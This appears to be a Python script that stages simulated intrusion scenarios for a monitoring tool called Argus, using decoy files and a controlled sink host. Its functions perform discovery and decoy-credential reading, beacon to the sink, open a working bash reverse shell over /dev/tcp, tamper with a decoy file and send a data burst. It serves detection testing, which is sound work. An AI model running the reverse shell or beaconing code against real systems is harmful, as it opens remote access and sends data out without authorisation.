#!/usr/bin/env python3
"""Run bounded Argus demo actions without transient shell and sleep helpers."""

from __future__ import annotations

import argparse
import os
import shlex
import signal
import socket
import subprocess
import time
from pathlib import Path


def _run_and_print(
    label: str, command: list[str], *, hold_seconds: float = 1.5
) -> None:
    print(f"--- {label} ---", flush=True)
    result = subprocess.run(
        command,
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )
    print(result.stdout.rstrip(), flush=True)
    time.sleep(hold_seconds)


def discovery(marker: str) -> None:
    _run_and_print(f"{marker}-uname", ["uname", "-a"])
    _run_and_print(f"{marker}-id", ["id"])

    print(f"--- {marker}-ps ---", flush=True)
    result = subprocess.run(
        ["ps", "aux"],
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )
    print("\n".join(result.stdout.splitlines()[:20]), flush=True)
    time.sleep(1.5)

    print(f"--- {marker}-decoys ---", flush=True)
    for path in (Path("/decoys/credentials.txt"), Path("/decoys/runbook.txt")):
        print(f"{path}:\n{path.read_text()}", flush=True)
    listing = subprocess.run(
        ["ls", "-la", "/decoys"],
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )
    print(listing.stdout.rstrip(), flush=True)
    time.sleep(1.5)


def phone_home(run_id: str, sink_ip: str, sink_port: int) -> None:
    with socket.create_connection(
        (sink_ip, sink_port), timeout=5
    ) as connection:
        connection.sendall(f"{run_id}\n".encode())
        print(f"connected to controlled demo sink {sink_ip}:{sink_port}", flush=True)
        time.sleep(20)


def reverse_shell(marker: str, sink_ip: str, sink_port: int) -> None:
    command = (
        f"exec -a {shlex.quote(marker)} bash --noprofile --norc -i "
        f"0<>/dev/tcp/{shlex.quote(sink_ip)}/{sink_port} 1>&0 2>&0"
    )
    process = subprocess.Popen(
        ["/bin/bash", "--noprofile", "--norc", "-c", command],
        start_new_session=True,
    )
    try:
        process.wait(timeout=20)
    except subprocess.TimeoutExpired:
        try:
            os.killpg(process.pid, signal.SIGKILL)
        except ProcessLookupError:
            pass
        process.wait()


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "scenario",
        choices=(
            "discovery",
            "phone-home",
            "reverse-shell",
            "decoy-modify",
            "network-burst",
            "compute-simulation",
        ),
    )
    parser.add_argument("marker")
    parser.add_argument("sink_ip", nargs="?", default="")
    parser.add_argument("sink_port", nargs="?", type=int, default=4444)
    args = parser.parse_args()

    if args.scenario == "discovery":
        discovery(args.marker)
    elif args.scenario == "phone-home":
        phone_home(args.marker.rsplit("-", 1)[-1], args.sink_ip, args.sink_port)
    elif args.scenario == "reverse-shell":
        reverse_shell(args.marker, args.sink_ip, args.sink_port)
    elif args.scenario == "decoy-modify":
        path = Path("/decoys/credentials.txt")
        path.write_text(path.read_text() + "tampered-by-demo\n")
        print(path.read_text(), flush=True)
        time.sleep(1.5)
    elif args.scenario == "network-burst":
        with socket.create_connection(
            (args.sink_ip, args.sink_port), timeout=3
        ) as connection:
            payload = bytes(1024 * 1024)
            for _ in range(5):
                connection.sendall(payload)
    elif args.scenario == "compute-simulation":
        result = sum(value * value for value in range(1, 5001))
        print(f"compute-done {result}", flush=True)
        time.sleep(1.5)


if __name__ == "__main__":
    main()
